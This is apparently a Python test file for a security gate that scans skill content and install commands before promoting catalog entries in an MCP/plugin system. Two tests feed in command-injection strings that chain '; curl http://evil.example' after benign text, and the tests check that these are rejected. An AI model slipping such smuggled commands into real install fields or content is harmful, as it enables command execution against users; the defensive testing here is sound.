"""Tests para Pieza 2 — trial-en-jaula (primera vertical: contenido estático)."""

from __future__ import annotations

from pathlib import Path

import pytest

from atlas.mcp.catalog import CatalogEntry
from atlas.mcp.catalog import StatusPromotion
from atlas.mcp.trial_gate import TrialGate, promote_after_trial, scan_content, trial_static_content


def _entry(**overrides: object) -> CatalogEntry:
    base = dict(
        name="demo-skill",
        sector="programacion",
        sector_label="Programación",
        kind="skill",
        purpose="demo",
        source="local",
        install="",
        status="candidato",
        tags=["programacion"],
        mode="served",
    )
    base.update(overrides)
    return CatalogEntry(**base)  # type: ignore[arg-type]


def test_scan_content_rejects_shell_metachar() -> None:
    text = "Buenas prácticas de seguridad. " * 3 + "; curl http://evil.example"
    assert scan_content(text) is not None


def test_scan_content_accepts_benign_skill() -> None:
    text = (
        "# Coding discipline\n\n"
        "Always write tests before merging. Keep diffs small and reversible.\n"
        "Prefer stdlib over new dependencies when possible."
    )
    assert scan_content(text) is None


def test_trial_static_content_promotes_candidato_on_pass() -> None:
    content = "# Skill\n\n" + ("Write small diffs. " * 5)
    result = trial_static_content(_entry(), content)
    assert result.passed is True
    assert result.suggested_status == "probado-en-jaula"


def test_trial_static_content_does_not_promote_verificado() -> None:
    content = "# Skill\n\n" + ("Write small diffs. " * 5)
    result = trial_static_content(_entry(status="verificado"), content)
    assert result.passed is True
    assert result.suggested_status is None


def test_promote_after_trial_only_from_candidato() -> None:
    assert promote_after_trial("candidato", True) == "probado-en-jaula"
    assert promote_after_trial("candidato", False) is None
    assert promote_after_trial("probado-en-jaula", True) is None


def test_trial_gate_skill_from_disk(tmp_path: Path) -> None:
    skills = tmp_path / "skills"
    skills.mkdir()
    (skills / "atlas-coding-discipline.md").write_text(
        "# Discipline\n\n" + ("Keep tests green and mypy strict. " * 4),
        encoding="utf-8",
    )
    gate = TrialGate(skill_root=skills)
    result = gate.trial(_entry(name="atlas-coding-discipline"))
    assert result.passed is True
    assert result.suggested_status == "probado-en-jaula"


def test_trial_gate_skips_mcp_connected_without_install() -> None:
    gate = TrialGate()
    result = gate.trial(_entry(kind="mcp", mode="connected", name="ext"))
    assert result.skipped is True
    assert "install" in result.reason.lower()


def test_trial_gate_mcp_vets_install_argv() -> None:
    gate = TrialGate()
    result = gate.trial(
        _entry(
            kind="mcp",
            mode="connected",
            name="everything",
            install="npx -y @modelcontextprotocol/server-everything",
        )
    )
    assert result.passed is False
    assert result.skipped is True
    assert result.suggested_status is None
    assert "staging" in result.reason.lower()


def test_trial_gate_plugin_requires_local_staging_admission() -> None:
    gate = TrialGate()
    result = gate.trial(
        _entry(
            kind="plugin",
            mode="installed",
            name="remote-plugin",
            install="npx -y remote-plugin",
        )
    )

    assert result.passed is False
    assert result.skipped is True
    assert result.suggested_status is None
    assert "staging" in result.reason.lower()


def test_trial_gate_does_not_promote_remote_static_or_executable_kinds_without_staging() -> None:
    gate = TrialGate()
    remote_skill = gate.trial(
        _entry(
            kind="skill",
            mode="served",
            name="remote-skill",
            install="npx -y remote-skill",
        )
    )
    remote_hook = gate.trial(
        _entry(
            kind="hook",
            mode="installed",
            name="remote-hook",
            install="npx -y remote-hook",
        )
    )

    for result in (remote_skill, remote_hook):
        assert result.passed is False
        assert result.skipped is True
        assert result.suggested_status is None
        assert "staging" in result.reason.lower()


def test_trial_gate_does_not_promote_unstaged_local_third_party_mcp() -> None:
    gate = TrialGate()
    result = gate.trial(
        _entry(
            kind="mcp",
            mode="connected",
            name="local-third-party",
            install="python -m third_party_mcp",
        )
    )

    assert result.passed is False
    assert result.skipped is True
    assert result.suggested_status is None
    assert "staging" in result.reason.lower()


def test_trial_gate_promotes_only_an_explicitly_admitted_staged_plugin(
    tmp_path: Path,
) -> None:
    import json

    from atlas.mcp.plugin_admission import PluginAdmissionGate

    staging = tmp_path / "staging"
    root = staging / "demo-plugin"
    root.mkdir(parents=True)
    (root / "atlas-plugin.json").write_text(
        json.dumps(
            {
                "schema_version": "1.0",
                "plugin_id": "demo-plugin",
                "display_name": "Demo plugin",
                "version": "1.0.0",
                "source": {
                    "origin": "local://test/demo-plugin",
                    "revision": "fixture-1",
                    "license": "Apache-2.0",
                },
                "activation": "declarative",
                "permissions": [],
                "contributions": [
                    {
                        "contribution_id": "demo-skill",
                        "kind": "skill",
                        "path": "skills/demo.md",
                    }
                ],
            }
        ),
        encoding="utf-8",
    )
    (root / "skills").mkdir()
    (root / "skills" / "demo.md").write_text(
        "# Demo\n\nKeep diffs small, verify tests, and ask before external effects.\n",
        encoding="utf-8",
    )
    gate = TrialGate(
        plugin_admission_gate=PluginAdmissionGate(staging_root=staging),
        plugin_root_resolver=lambda _entry: root,
    )

    result = gate.trial(
        _entry(kind="plugin", mode="installed", name="demo-plugin")
    )

    assert result.passed is True
    assert result.skipped is False
    assert result.suggested_status == "probado-en-jaula"
    assert "admitido" in result.reason.lower()


def test_trial_gate_rejects_install_with_shell_metachar() -> None:
    gate = TrialGate()
    result = gate.trial(
        _entry(
            kind="mcp",
            mode="connected",
            name="evil",
            install="npx foo; curl http://evil.example",
        )
    )
    assert result.passed is False
    assert result.skipped is False


def test_trial_gate_agents_skill_path(tmp_path: Path) -> None:
    agents = tmp_path / "agents"
    skill_dir = agents / "my-skill"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text(
        "# Skill\n\n" + ("Use small diffs and run tests. " * 4),
        encoding="utf-8",
    )
    gate = TrialGate(agents_skill_root=agents)
    result = gate.trial(_entry(name="my-skill"))
    assert result.passed is True


def test_apply_status_promotions(tmp_path: Path) -> None:
    from atlas.mcp.catalog import apply_status_promotions, load_catalog

    cat = tmp_path / "cat.yaml"
    cat.write_text(
        """
sectors:
  programacion:
    label: Prog
    entries:
      - {name: a, kind: skill, status: candidato, mode: served, install: ""}
      - {name: b, kind: skill, status: verificado, mode: served, install: ""}
""",
        encoding="utf-8",
    )
    n = apply_status_promotions(
        cat,
        [StatusPromotion(name="a", kind="skill", to_status="probado-en-jaula")],
    )
    assert n == 1
    entries = load_catalog(cat)
    by_name = {e.name: e.status for e in entries}
    assert by_name["a"] == "probado-en-jaula"
    assert by_name["b"] == "verificado"


def test_catalog_accepts_probado_en_jaula_status(tmp_path: Path) -> None:
    from atlas.mcp.catalog import load_catalog

    cat = tmp_path / "cat.yaml"
    cat.write_text(
        """
sectors:
  programacion:
    label: Prog
    entries:
      - {name: x, kind: skill, status: probado-en-jaula, mode: served, install: ""}
""",
        encoding="utf-8",
    )
    entries = load_catalog(cat)
    assert entries[0].status == "probado-en-jaula"
